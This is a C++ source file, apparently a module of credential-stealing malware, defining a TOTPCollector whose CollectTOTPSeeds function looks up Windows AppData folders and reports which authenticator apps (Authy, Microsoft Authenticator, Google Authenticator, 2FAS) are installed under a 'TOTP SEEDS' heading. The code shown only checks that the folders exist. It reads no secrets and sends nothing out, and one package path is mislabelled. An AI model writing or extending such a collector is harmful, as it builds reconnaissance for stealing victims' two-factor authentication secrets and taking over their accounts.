#include "totp_collector.h"
#include <Windows.h>
#include <shlobj.h>
#include <iostream>
#include <sstream>
#include <filesystem>
#include <vector>

std::string TOTPCollector::CollectTOTPSeeds() {
    std::ostringstream result;
    result << "\n=== TOTP SEEDS ===\n";
    
    char appdata[MAX_PATH], localappdata[MAX_PATH];
    SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, SHGFP_TYPE_CURRENT, appdata);
    SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, SHGFP_TYPE_CURRENT, localappdata);
    
    std::vector<std::pair<std::string, std::string>> totpApps = {
        {"Authy", std::string(appdata) + "\\Authy Desktop"},
        {"Microsoft Authenticator", std::string(localappdata) + "\\Packages\\Microsoft.CompanyPortal_8wekyb3d8bbwe"},
        {"Google Authenticator", std::string(localappdata) + "\\Packages\\GoogleCorporation.Authenticator_8wekyb3d8bbwe"},
        {"2FAS", std::string(appdata) + "\\2FAS"}
    };
    
    int found = 0;
    for (const auto& [name, path] : totpApps) {
        if (std::filesystem::exists(path)) {
            result << name << ": FOUND\n";
            found++;
        }
    }
    
    result << "Total TOTP apps found: " << found << "\n";
    
    return result.str();
}
